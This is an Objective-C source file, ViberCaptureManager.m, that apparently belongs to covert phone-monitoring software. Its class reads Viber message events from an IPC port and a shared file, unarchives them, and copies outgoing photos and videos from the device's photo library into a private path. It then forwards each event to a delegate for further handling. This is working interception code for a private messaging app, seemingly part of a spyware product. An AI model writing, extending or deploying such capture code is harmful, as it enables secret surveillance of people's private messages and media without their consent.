//
//  ViberCaptureManager.m
//  ViberCaptureManager
//
//  Created by Makara Khloth on 11/27/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "ViberCaptureManager.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxAttachment.h"
#import "FxIMEventUtils.h"

#import <UIKit/UIKit.h>

@implementation ViberCaptureManager

@synthesize mEventDelegate;

- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
	[self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
	[self setMEventDelegate:nil];
}

- (void) startCapture {
	DLog (@"Start capture Viber messenger");
	if (!mMessagePortReader) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kViberMessagePort 
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}
	
	if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
		if (mSharedFileReader1 == nil) {
			mSharedFileReader1 = [[SharedFile2IPCReader alloc] initWithSharedFileName:kViberMessagePort
																		 withDelegate:self];
			[mSharedFileReader1 start];
		}
	}
}

- (void) stopCapture {
	DLog (@"Stop capture Viber messenger");
	if (mMessagePortReader) {
		[mMessagePortReader stop];
		[mMessagePortReader release];
		mMessagePortReader = nil;
	}
	
	if (mSharedFileReader1 != nil) {
		[mSharedFileReader1 stop];
		[mSharedFileReader1 release];
		mSharedFileReader1 = nil;
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxIMEvent *imEvent = [unarchiver decodeObjectForKey:kViberArchied];
	DLog(@"Viber - imEvent = %@", imEvent);
    [unarchiver finishDecoding];
	
	if ([[imEvent mMessageIdOfIM] isEqualToString:@"outgoing video"]			||
		[[imEvent mMessageIdOfIM] isEqualToString:@"outgoing photo from album"]	) {
		FxAttachment *attachment = [[imEvent mAttachments] objectAtIndex:0];
		NSString *albumPath = [imEvent mOfflineThreadId];
		NSString *savePath = [attachment fullPath];
		
		NSError *error = nil;
		NSFileManager *fileManager = [NSFileManager defaultManager];
		[fileManager copyItemAtPath:albumPath toPath:savePath error:&error];
		DLog (@"Copy photo/video from photo library to private path, error = %@", error);
	}
		
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {		
		NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:imEvent];	
		for (FxEvent *imStructureEvent in imStructureEvents) {		
			DLog (@"sending %@ ...", imStructureEvent);
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];				
		}			
	}
	[unarchiver release];
}

- (void) dataDidReceivedFromSharedFile2: (NSData*) aRawData {
	[self dataDidReceivedFromMessagePort:aRawData];
}

- (void) dealloc {
	[self stopCapture];
	[super dealloc];
}

@end
